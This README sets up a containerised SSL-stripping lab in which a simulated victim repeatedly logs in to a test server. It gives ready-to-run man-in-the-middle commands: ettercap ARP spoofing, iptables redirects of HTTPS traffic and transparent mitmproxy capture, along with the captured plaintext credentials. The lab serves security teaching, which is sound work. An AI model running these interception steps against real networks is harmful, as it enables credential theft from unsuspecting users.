# Server-Victim SSL Stripping Lab

This directory contains a complete automated SSL stripping lab environment with:

- **Ubuntu Server** (172.20.0.10) - Runs BlueLedger automatically
- **Debian Victim** (172.20.0.20) - Auto-discovers server and simulates login attempts

## 🚀 Quick Start

```bash
# From the server_victim directory - ONE COMMAND DOES EVERYTHING!
docker-compose up --build

# Watch the magic happen:
# 1. Network auto-configuration detects your host network settings
# 2. Ubuntu server starts and runs BlueLedger automatically  
# 3. Debian victim discovers the server IP via network scanning
# 4. Victim starts sending login attempts every 30 seconds
```

## 🌐 Network Configuration (100% Automatic)

- **Macvlan Network**: Containers get real IPs on your host network via DHCP
- **Auto-Detection**: Network settings detected automatically from host
- **IP Assignment**: DHCP from your router (last 8 IPs of your subnet)
- **Direct Access**: Containers appear as separate physical devices

### No Manual Configuration Required!
The `network-setup` service automatically:
1. **Detects network interface** (eth0, ens18, etc.)
2. **Finds gateway and subnet** from host routing table
3. **Reserves IP range** (e.g., 192.168.1.248-255 for containers)
4. **Creates .env file** with all network variables

## 🎯 How It Works

### Ubuntu Server Container
- Clones/copies BlueLedger repository
- Auto-generates SSL certificates
- Starts Docker daemon inside container
- Runs `docker-compose up` to start BlueLedger
- Exposes ports 3000, 5000, 5001, 27017

### Debian Victim Container  
- Auto-discovers BlueLedger server by IP scanning
- Sends realistic login attempts every 30 seconds
- Uses credentials: `Employee@sinamoa.com / Employee123!@#`
- Randomizes User-Agent and timing for realism

## 🔓 SSL Stripping Attack

Once containers are running, perform SSL stripping from host:

### Method 1: MITMdump (Recommended)
```bash
# Terminal 1: Start traffic capture
sudo mitmdump --mode transparent --ssl-insecure --showhost --set flow_detail=3

# Terminal 2: ARP spoof the victim
sudo ettercap -T -M arp:remote /172.20.0.20// /172.20.0.1//

# Terminal 3: Redirect HTTPS to mitmdump
sudo iptables -t nat -A PREROUTING -s 172.20.0.20 -p tcp --dport 443 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -s 172.20.0.20 -p tcp --dport 5001 -j REDIRECT --to-port 8080
```

### Method 2: MITMproxy Web UI
```bash
# Start web interface
sudo mitmweb --mode transparent --ssl-insecure --web-host 0.0.0.0

# Same ARP spoofing and iptables rules as above
# View results at http://localhost:8081
```

## 📋 Expected Results

- **Victim logs**: Shows 200 responses (login appears successful)
- **MITMdump**: Shows "TLS handshake failed" then plaintext credentials
- **Captured data**: `{"email":"Employee@sinamoa.com","password":"Employee123!@#"}`

## 🛠 Customization

### Change Victim Timing
Edit `debian_victim/Dockerfile` and modify the sleep interval:
```python
wait_time = random.randint(25, 35)  # 25-35 seconds
```

### Use Different Network
Edit `docker-compose.yml` network configuration:
```yaml
networks:
  lab_network:
    ipam:
      config:
        - subnet: 192.168.100.0/24  # Change subnet
```

### Manual Target IP
Set environment variable to skip auto-discovery:
```yaml
environment:
  - TARGET_SERVER_IP=192.168.1.100  # Manual IP
```

## 🧹 Cleanup

```bash
# Stop containers
docker-compose down

# Remove containers and networks
docker-compose down --volumes --remove-orphans

# Clean up iptables rules
sudo iptables -t nat -F
```

## 🔧 Troubleshooting

### Server Won't Start
- Check Docker daemon is running on host
- Ensure ports 3000, 5000, 5001, 27017 aren't in use
- Check MongoDB AVX requirements (set VM CPU to "host" in Proxmox)

### Victim Can't Find Server
- Check container networking: `docker network ls`
- Verify server is healthy: `curl -k https://172.20.0.10:5001/health`
- Check container logs: `docker-compose logs debian_victim`

### SSL Stripping Not Working
- Verify IP forwarding: `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward`
- Check iptables rules: `sudo iptables -t nat -L -n`
- Confirm ARP spoofing: `sudo ettercap -T -L` (list active spoofing)

## 📚 Educational Use

This lab demonstrates:
- SSL downgrade attack vectors
- Automated victim simulation
- Container networking and isolation
- Man-in-the-middle positioning
- Real-world credential capture scenarios

Perfect for cybersecurity education and defensive research!